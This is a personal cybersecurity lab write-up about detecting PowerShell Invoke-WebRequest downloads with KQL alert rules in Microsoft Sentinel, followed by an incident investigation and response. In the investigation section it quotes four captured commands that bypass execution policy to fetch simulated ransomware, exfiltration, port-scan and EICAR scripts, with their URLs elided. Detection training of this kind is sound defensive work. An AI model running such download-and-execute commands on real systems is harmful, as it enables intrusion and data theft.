# ⚠️ Incident Response Lab: PowerShell Suspicious Web Request

**Author**: Jason Nguyen  
**Date**: June 2025  
**Scenario**: Post-exploitation detection using PowerShell logging and scheduled alerts in Microsoft Sentinel  
**Based on**: [Josh Madakor’s Cyber Range](https://github.com/joshmadakor1/lognpacific-public)

---

## 🧰 Tools and Technologies

* **Microsoft Sentinel** (SIEM)
* **Microsoft Defender for Endpoint** (EDR)
* **Log Analytics Workspace** (LAW)
* **KQL (Kusto Query Language)**
* **PowerShell**

---

## 🧠 Scenario Overview

In real-world attacks, adversaries often use built-in tools like PowerShell to download payloads from external sources—blending malicious activity with legitimate system processes. This lab explores how to detect such behavior by creating KQL-based scheduled alerts in Microsoft Sentinel to identify suspicious use of `Invoke-WebRequest`.

---

## 🔍 Part 1: Create a Scheduled Alert Rule

### 📌 Goal
Detect when PowerShell executes `Invoke-WebRequest` on a specific endpoint (`windows-target-1`), potentially indicating malicious behavior.

### 🧪 Attempted KQL (Initial Query)
```kql
DeviceProcessEvents
| where DeviceName == "windows-target-1"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated desc
````

✅ This returned **no results in the last 7 days**.

### ✅ Working Query (Adjusted Time Range)

```kql
let TargetHostname = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| where TimeGenerated > ago(30d)
| order by TimeGenerated
```

This query detected the download of 4 scripts previously used in earlier labs: `pwncrypt.ps1`, `eicar.ps1`, `portscan.ps1`, and `exfiltratedata.ps1`.

### 📌 Key Terminology

* `InitiatingProcessCommandLine`: Refers to the **parent process** that launched PowerShell.
* `ProcessCommandLine`: Refers to the **child process** (i.e., the PowerShell script or command being run).

---

### ⚙️ Alert Rule Configuration

| Setting                | Value                                                                        |
| ---------------------- | ---------------------------------------------------------------------------- |
| **Rule Name**          | PowerShell Suspicious Web Request                                            |
| **Rule Type**          | Scheduled Query Rule                                                         |
| **Query**              | See below                                                                    |
| **Frequency**          | Every 4 hours                                                                |
| **Lookup Period**      | Last 14 days                                                                 |
| **Entity Mapping**     | Account → Account Name<br>Host → Device Name<br>Process → ProcessCommandLine |
| **Threshold**          | Alert if count > 0                                                           |
| **Suppression**        | Stop alerting for 24 hours after hit                                         |
| **Incident Creation**  | Enabled                                                                      |
| **MITRE ATT\&CK Tags** | T1059.001, T1203, T1071.001, T1105, T1041                                    |

### 🔎 Final Rule Query

```kql
DeviceProcessEvents
| where DeviceName == "windows-target-1"
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated desc
```

---

## 🚨 Part 2: Trigger Alert to Create Incident

No custom VM used. I leveraged the logs from `windows-target-1`, which had existing activity from automated attacks.

---

## 🛠️ Part 3: Incident Investigation and Response

### 🧾 Incident Summary

**Incident Name**: `J - PowerShell Suspicious Web Request`
**Device**: `windows-target-1`
**Triggered by**: A single user executing 4 PowerShell download commands.

### 🔗 Malicious Commands Detected:

```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../pwncrypt.ps1 -OutFile C:\ProgramData\pwncrypt.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../exfiltratedata.ps1 -OutFile C:\ProgramData\exfiltratedata.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../portscan.ps1 -OutFile C:\ProgramData\portscan.ps1
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://.../eicar.ps1 -OutFile C:\ProgramData\eicar.ps1
```

👤 **User Interview Summary**:
User claimed to be installing free software but saw only a black screen. No GUI feedback. Suspicious behavior noted.

### 🧪 KQL Script Execution Validation

```kql
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

✅ Confirmed that each script was executed post-download.

### 📄 Script Behavior Summaries (Generated via AI):

| Script               | Description                                                                |
| -------------------- | -------------------------------------------------------------------------- |
| `pwncrypt.ps1`       | Simulates ransomware by encrypting fake files and placing ransom notes.    |
| `exfiltratedata.ps1` | Generates and uploads mock sensitive data to cloud storage (simulated C2). |
| `portscan.ps1`       | Performs local subnet scans for open ports and active hosts.               |
| `eicar.ps1`          | Creates EICAR antivirus test file to trigger malware alerts.               |

---

## 🧯 Containment, Eradication, Recovery

* ✅ **Isolated** the affected VM from the network.
* ✅ **Ran** full antivirus scan using Microsoft Defender for Endpoint.
* ✅ **Restored** system after scan returned clean.

---

## 📚 Post-Incident Actions

* 🧑‍🏫 User completed cybersecurity awareness retraining.
* 🛡️ Upgraded awareness program with KnowBe4.
* 🔒 Initiated policy restricting PowerShell to admin users only.
* 🗓️ Increased training frequency for all employees.

---

## ✅ Closure

* Incident marked as **True Positive**
* Activity log updated in Microsoft Sentinel
* Alert rule deleted after analysis
* Lessons learned documented

---

## 📌 MITRE ATT&CK Mapping

| Tactic            | Technique ID | Technique Name                    |
| ----------------- | ------------ | --------------------------------- |
| Execution         | T1059.001    | PowerShell                        |
| Initial Access    | T1203        | Exploitation for Client Execution |
| Command & Control | T1071.001    | Web Protocols                     |
| Command & Control | T1105        | Ingress Tool Transfer             |
| Exfiltration      | T1041        | Exfiltration Over C2 Channel      |

---

> 🧪 *This lab reinforced detection techniques for abuse of legitimate tools like PowerShell in post-exploitation phases. It also emphasized the need for baseline behavior monitoring, entity mapping, and structured incident response in Sentinel.*


